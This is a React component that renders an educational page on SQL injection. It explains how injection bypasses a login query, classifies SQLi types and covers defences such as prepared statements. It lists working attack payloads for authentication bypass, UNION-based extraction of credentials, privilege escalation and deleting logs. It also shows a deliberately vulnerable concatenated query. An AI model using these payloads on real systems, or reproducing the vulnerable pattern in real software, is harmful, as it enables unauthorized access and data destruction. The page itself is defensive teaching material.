import React from "react";

const SQLInjection: React.FC = () => (
  <div className="p-8 space-y-8 rounded-xl shadow-lg mt-20">
    <h1 className="text-4xl font-extrabold border-b-2 pb-2">
      SQL Injection
    </h1>
    <p className="text-sm text-gray-500">Last Updated: 16 Jan, 2026</p>

    <p className="text-lg leading-relaxed">
      SQL Injection (SQLi) is a code injection technique that exploits vulnerabilities in
      applications that construct SQL queries from user input. It allows attackers to interfere
      with queries, access unauthorized data, or modify database content.
    </p>

    <h2 className="text-3xl font-bold mt-8">How SQL Injection Works</h2>
    <div className="bg-gray-100 text-gray-900 p-6 rounded-lg mt-4 font-mono text-sm text-gray-900">
      <pre className="whitespace-pre-wrap text-gray-900">
{`Vulnerable Code Example:

// User input
username = "admin"
password = "' OR '1'='1"

// Vulnerable query construction
query = "SELECT * FROM users WHERE
         username='" + username + "'
         AND password='" + password + "'"

// Resulting query:
SELECT * FROM users WHERE
username='admin' AND password='' OR '1'='1'

The condition '1'='1' is always TRUE
Result: Attacker bypasses authentication!`}
      </pre>
    </div>

    <h2 className="text-3xl font-bold mt-8">Types of SQL Injection</h2>
    <div className="overflow-x-auto mt-4">
      <table className="min-w-full border border-gray-300 text-left">
        <thead className="bg-gray-200">
          <tr>
            <th className="p-3 border">Type</th>
            <th className="p-3 border">Description</th>
            <th className="p-3 border">Example</th>
          </tr>
        </thead>
        <tbody className="bg-white text-gray-900">
          <tr>
            <td className="p-3 border font-semibold">In-band (Classic)</td>
            <td className="p-3 border">Results returned directly</td>
            <td className="p-3 border">{`' UNION SELECT * FROM users--`}</td>
          </tr>
          <tr>
            <td className="p-3 border font-semibold">Error-based</td>
            <td className="p-3 border">Use error messages for info</td>
            <td className="p-3 border">{`' AND 1=CONVERT(int,'a')--`}</td>
          </tr>
          <tr>
            <td className="p-3 border font-semibold">Blind (Boolean)</td>
            <td className="p-3 border">True/false responses</td>
            <td className="p-3 border">{`' AND 1=1-- (true)`}</td>
          </tr>
          <tr>
            <td className="p-3 border font-semibold">Time-based</td>
            <td className="p-3 border">Delays indicate results</td>
            <td className="p-3 border">{`'; WAITFOR DELAY '0:0:5'--`}</td>
          </tr>
          <tr>
            <td className="p-3 border font-semibold">Out-of-band</td>
            <td className="p-3 border">Data sent externally</td>
            <td className="p-3 border">DNS/HTTP exfiltration</td>
          </tr>
        </tbody>
      </table>
    </div>

    <h2 className="text-3xl font-bold mt-8">Common Attack Payloads</h2>
    <div className="bg-gray-100 text-gray-900 p-4 rounded-lg mt-4 font-mono text-gray-900">
      <pre className="whitespace-pre-wrap text-gray-900">
{`Authentication Bypass:
' OR '1'='1' --
' OR '1'='1' /*
admin'--
' OR 1=1#

Data Extraction (UNION):
' UNION SELECT username,password FROM users--
' UNION SELECT null,table_name FROM information_schema.tables--

Database Fingerprinting:
' AND @@version--         (SQL Server)
' AND version()--         (MySQL)
' AND banner FROM v$version-- (Oracle)

Data Modification:
'; UPDATE users SET role='admin' WHERE username='attacker'--
'; DELETE FROM logs--`}
      </pre>
    </div>

    <h2 className="text-3xl font-bold mt-8">Prevention Methods</h2>
    <div className="bg-gray-100 text-gray-900 p-4 rounded-lg mt-4 font-mono text-gray-900">
      <pre className="whitespace-pre-wrap text-gray-900">
{`1. PARAMETERIZED QUERIES (Prepared Statements)

// VULNERABLE:
query = "SELECT * FROM users WHERE id = " + userInput;

// SECURE (Java):
PreparedStatement stmt = conn.prepareStatement(
    "SELECT * FROM users WHERE id = ?");
stmt.setInt(1, userInput);

// SECURE (Python):
cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))

2. INPUT VALIDATION
- Whitelist allowed characters
- Validate data type and length
- Reject suspicious input

3. LEAST PRIVILEGE
- Database accounts with minimal permissions
- Separate accounts for different functions

4. WAF RULES
- Block common SQLi patterns
- Virtual patching`}
      </pre>
    </div>

    <h2 className="text-3xl font-bold mt-8">Key Points to Remember</h2>
    <div className="bg-yellow-50 dark:bg-yellow-900/20 p-4 rounded-lg mt-4">
      <ul className="list-disc list-inside leading-relaxed space-y-2">
        <li>Never concatenate user input into SQL queries</li>
        <li>Always use parameterized queries/prepared statements</li>
        <li>Validate and sanitize all user input</li>
        <li>Use least privilege for database accounts</li>
        <li>Implement WAF as additional defense layer</li>
        <li>Regular security testing for SQLi vulnerabilities</li>
      </ul>
    </div>
  </div>
);

export default SQLInjection;
